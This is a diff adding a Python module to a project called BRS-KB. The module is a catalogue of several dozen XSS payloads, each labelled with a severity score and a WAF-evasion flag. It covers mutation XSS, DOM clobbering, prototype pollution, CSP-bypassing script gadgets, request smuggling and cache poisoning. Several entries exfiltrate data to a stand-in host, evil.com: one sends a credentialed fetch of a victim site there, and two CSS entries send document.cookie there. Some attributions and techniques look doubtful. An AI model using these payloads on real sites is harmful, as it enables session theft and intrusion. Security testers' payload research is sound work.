@@ -1,0 +1,536 @@
+# Project: BRS-KB
+# Company: EasyProTech LLC (www.easypro.tech)
+# Dev: Brabus
+# Date: 2025-12-26 UTC
+# Status: Created
+# Telegram: https://t.me/EasyProTech
+
+"""
+Research Papers XSS Payloads
+
+Payloads from academic security research, conference presentations,
+and security papers. Cutting-edge techniques.
+"""
+
+from ..models import PayloadEntry
+
+
+BRS_KB_RESEARCH_PAPERS_PAYLOADS = {
+    # ============================================================
+    # USENIX SECURITY PAPERS
+    # ============================================================
+    # Browser Parser Differential
+    "research-parser-diff-1": PayloadEntry(
+        payload="<scr<script>ipt>alert(1)</scr</script>ipt>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="Parser differential: nested script tag",
+        tags=["research", "parser", "differential"],
+        bypasses=["parser_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # DOM Clobbering Research
+    "research-dom-clobbering-1": PayloadEntry(
+        payload='<form id="x"><input id="y" name="z"></form><script>x.y.z</script>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="DOM clobbering via form elements",
+        tags=["research", "dom-clobbering"],
+        bypasses=["dom_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "research-dom-clobbering-2": PayloadEntry(
+        payload='<a id="x"><a id="x" name="y" href="javascript:alert(1)">',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="DOM clobbering via duplicate IDs",
+        tags=["research", "dom-clobbering"],
+        bypasses=["dom_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "research-dom-clobbering-3": PayloadEntry(
+        payload='<iframe name="alert" src="javascript:parent.alert(1)"></iframe>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="DOM clobbering via iframe name",
+        tags=["research", "dom-clobbering", "iframe"],
+        bypasses=["dom_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # Prototype Pollution Research
+    "research-proto-pollution-1": PayloadEntry(
+        payload='{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
+        contexts=["json"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Prototype pollution via JSON",
+        tags=["research", "prototype-pollution"],
+        bypasses=["json_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "research-proto-pollution-2": PayloadEntry(
+        payload='{"constructor":{"prototype":{"src":"javascript:alert(1)"}}}',
+        contexts=["json"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Prototype pollution via constructor",
+        tags=["research", "prototype-pollution"],
+        bypasses=["json_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # BLACK HAT / DEF CON PRESENTATIONS
+    # ============================================================
+    # Mutation XSS (mXSS)
+    "mxss-noscript": PayloadEntry(
+        payload='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
+        contexts=["html_content"],
+        severity="critical",
+        cvss_score=9.0,
+        description="mXSS via noscript mutation",
+        tags=["blackhat", "mxss", "noscript"],
+        bypasses=["sanitizer"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "mxss-title": PayloadEntry(
+        payload="<title><img src=x onerror=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="mXSS via title element",
+        tags=["blackhat", "mxss", "title"],
+        bypasses=["sanitizer"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    "mxss-style": PayloadEntry(
+        payload="<style><img src=x onerror=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="mXSS via style element",
+        tags=["blackhat", "mxss", "style"],
+        bypasses=["sanitizer"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    "mxss-xmp": PayloadEntry(
+        payload="<xmp><img src=x onerror=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="mXSS via xmp element",
+        tags=["blackhat", "mxss", "xmp"],
+        bypasses=["sanitizer"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    "mxss-listing": PayloadEntry(
+        payload="<listing><img src=x onerror=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="mXSS via listing element (obsolete)",
+        tags=["blackhat", "mxss", "listing"],
+        bypasses=["sanitizer"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # Script Gadgets Research (Google)
+    "gadget-require-1": PayloadEntry(
+        payload='<script data-main="data:,alert(1)"></script><script src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.3.6/require.min.js"></script>',
+        contexts=["html_content"],
+        severity="critical",
+        cvss_score=9.0,
+        description="RequireJS script gadget",
+        tags=["blackhat", "gadget", "requirejs"],
+        bypasses=["csp"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "gadget-bootstrap-1": PayloadEntry(
+        payload='<div data-toggle="tooltip" data-html="true" title="<img src=x onerror=alert(1)>"></div>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Bootstrap tooltip gadget",
+        tags=["blackhat", "gadget", "bootstrap"],
+        bypasses=["csp"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "gadget-angular-ng-app": PayloadEntry(
+        payload='<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>',
+        contexts=["html_content"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Angular ng-app ng-csp gadget",
+        tags=["blackhat", "gadget", "angular"],
+        bypasses=["csp"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "gadget-knockout-1": PayloadEntry(
+        payload="<div data-bind=\"html: '<img src=x onerror=alert(1)>'\"></div>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="Knockout.js data-bind gadget",
+        tags=["blackhat", "gadget", "knockout"],
+        bypasses=["csp"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "gadget-emberjs-1": PayloadEntry(
+        payload='{{#each items}}{{this.constructor.constructor("alert(1)")()}}{{/each}}',
+        contexts=["template"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Ember.js template gadget",
+        tags=["blackhat", "gadget", "ember"],
+        bypasses=["csp"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # ============================================================
+    # CCS PAPERS
+    # ============================================================
+    # PostMessage Security
+    "research-postmessage-1": PayloadEntry(
+        payload="window.parent.postMessage({type:'xss',data:'<script>alert(1)</script>'},'*')",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=8.0,
+        description="PostMessage parent injection",
+        tags=["research", "postmessage"],
+        bypasses=["origin_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "research-postmessage-2": PayloadEntry(
+        payload="window.opener.postMessage('xss','*')",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=8.0,
+        description="PostMessage opener injection",
+        tags=["research", "postmessage"],
+        bypasses=["origin_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # NDSS PAPERS
+    # ============================================================
+    # JavaScript Engine Exploitation
+    "research-jit-1": PayloadEntry(
+        payload="function f(x){return x+1}for(let i=0;i<100000;i++)f(i);f(alert)",
+        contexts=["javascript"],
+        severity="high",
+        cvss_score=7.5,
+        description="JIT spray pattern",
+        tags=["research", "jit"],
+        bypasses=["jit_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="low",
+    ),
+    # ============================================================
+    # IEEE S&P PAPERS
+    # ============================================================
+    # Cross-Origin Attacks
+    "research-cors-1": PayloadEntry(
+        payload="fetch('https://victim.com',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='//evil.com?'+t)",
+        contexts=["javascript"],
+        severity="critical",
+        cvss_score=9.0,
+        description="CORS credential stealing",
+        tags=["research", "cors"],
+        bypasses=["cors_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # ============================================================
+    # WOOT PAPERS
+    # ============================================================
+    # Browser Fingerprinting + XSS
+    "research-fingerprint-xss": PayloadEntry(
+        payload="navigator.plugins.length+navigator.userAgent+screen.width",
+        contexts=["javascript"],
+        severity="low",
+        cvss_score=4.0,
+        description="Browser fingerprinting for targeted XSS",
+        tags=["research", "fingerprint"],
+        bypasses=["fingerprint_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # PORTSWIGGER RESEARCH
+    # ============================================================
+    # HTTP Request Smuggling to XSS
+    "research-smuggle-xss": PayloadEntry(
+        payload="GET / HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /xss?p=<script>alert(1)</script> HTTP/1.1",
+        contexts=["header"],
+        severity="critical",
+        cvss_score=9.5,
+        description="HTTP request smuggling to XSS",
+        tags=["research", "smuggling"],
+        bypasses=["http_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # Web Cache Poisoning to XSS
+    "research-cache-poison-xss": PayloadEntry(
+        payload='X-Forwarded-Host: evil.com"><script>alert(1)</script>',
+        contexts=["header"],
+        severity="critical",
+        cvss_score=9.0,
+        description="Web cache poisoning to XSS",
+        tags=["research", "cache-poison"],
+        bypasses=["cache_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    # ============================================================
+    # CURE53 RESEARCH
+    # ============================================================
+    # SVG namespace tricks
+    "cure53-svg-namespace-1": PayloadEntry(
+        payload='<svg><foreignObject><![CDATA[<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>]]></foreignObject></svg>',
+        contexts=["svg"],
+        severity="high",
+        cvss_score=8.0,
+        description="SVG foreignObject namespace bypass",
+        tags=["cure53", "svg", "namespace"],
+        bypasses=["svg_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "cure53-svg-use-1": PayloadEntry(
+        payload='<svg><use href="data:image/svg+xml,<svg id=x xmlns=%22http://www.w3.org/2000/svg%22 xmlns:xlink=%22http://www.w3.org/1999/xlink%22><a xlink:href=%22javascript:alert(1)%22><rect width=100 height=100 /></a></svg>#x"></use></svg>',
+        contexts=["svg"],
+        severity="high",
+        cvss_score=8.0,
+        description="SVG use element data URI bypass",
+        tags=["cure53", "svg", "use"],
+        bypasses=["svg_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox"],
+        reliability="medium",
+    ),
+    # MathML tricks
+    "cure53-mathml-1": PayloadEntry(
+        payload='<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME<mtext>http://http://google.com</mtext></maction></math>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="MathML maction bypass",
+        tags=["cure53", "mathml"],
+        bypasses=["mathml_filters"],
+        waf_evasion=True,
+        browser_support=["firefox"],
+        reliability="medium",
+    ),
+    # ============================================================
+    # GOOGLE PROJECT ZERO
+    # ============================================================
+    # Chrome DevTools Protocol
+    "p0-devtools-1": PayloadEntry(
+        payload='{"id":1,"method":"Runtime.evaluate","params":{"expression":"alert(1)"}}',
+        contexts=["json"],
+        severity="critical",
+        cvss_score=9.5,
+        description="Chrome DevTools Protocol injection",
+        tags=["p0", "devtools"],
+        bypasses=["devtools_filters"],
+        waf_evasion=True,
+        browser_support=["chrome"],
+        reliability="low",
+    ),
+    # ============================================================
+    # HTML5SEC.ORG VECTORS
+    # ============================================================
+    "html5sec-1": PayloadEntry(
+        payload="<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="html5sec: body onscroll autoscroll",
+        tags=["html5sec", "scroll"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-2": PayloadEntry(
+        payload='<form><button formaction="javascript:alert(1)">X</button>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="html5sec: button formaction",
+        tags=["html5sec", "formaction"],
+        bypasses=["form_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-3": PayloadEntry(
+        payload='<isindex action="javascript:alert(1)" type="image">',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="html5sec: isindex action (obsolete)",
+        tags=["html5sec", "isindex"],
+        bypasses=["tag_filters"],
+        waf_evasion=True,
+        browser_support=[],
+        reliability="low",
+    ),
+    "html5sec-4": PayloadEntry(
+        payload="<input onfocus=alert(1) autofocus>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="html5sec: input autofocus onfocus",
+        tags=["html5sec", "autofocus"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-5": PayloadEntry(
+        payload="<select autofocus onfocus=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="html5sec: select autofocus onfocus",
+        tags=["html5sec", "autofocus"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-6": PayloadEntry(
+        payload="<textarea autofocus onfocus=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="html5sec: textarea autofocus onfocus",
+        tags=["html5sec", "autofocus"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-7": PayloadEntry(
+        payload="<keygen autofocus onfocus=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="html5sec: keygen autofocus (deprecated)",
+        tags=["html5sec", "keygen"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=[],
+        reliability="low",
+    ),
+    "html5sec-8": PayloadEntry(
+        payload='<video><source onerror="alert(1)">',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=8.0,
+        description="html5sec: source onerror",
+        tags=["html5sec", "source"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-9": PayloadEntry(
+        payload="<marquee onstart=alert(1)>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="html5sec: marquee onstart",
+        tags=["html5sec", "marquee"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    "html5sec-10": PayloadEntry(
+        payload="<marquee onfinish=alert(1) loop=1>",
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="html5sec: marquee onfinish",
+        tags=["html5sec", "marquee"],
+        bypasses=["event_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="high",
+    ),
+    # ============================================================
+    # ACADEMIC TIMING SIDE-CHANNELS
+    # ============================================================
+    "timing-css-1": PayloadEntry(
+        payload='<style>@import url("//evil.com/timing?"+document.cookie)</style>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="CSS import timing leak",
+        tags=["timing", "css"],
+        bypasses=["style_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+    "timing-font-1": PayloadEntry(
+        payload='<style>@font-face{font-family:x;src:url("//evil.com?"+document.cookie)}</style><div style="font-family:x">x</div>',
+        contexts=["html_content"],
+        severity="high",
+        cvss_score=7.5,
+        description="Font loading timing leak",
+        tags=["timing", "font"],
+        bypasses=["style_filters"],
+        waf_evasion=True,
+        browser_support=["chrome", "firefox", "safari", "edge"],
+        reliability="medium",
+    ),
+}
+
+BRS_KB_RESEARCH_PAPERS_TOTAL_PAYLOADS = len(BRS_KB_RESEARCH_PAPERS_PAYLOADS)
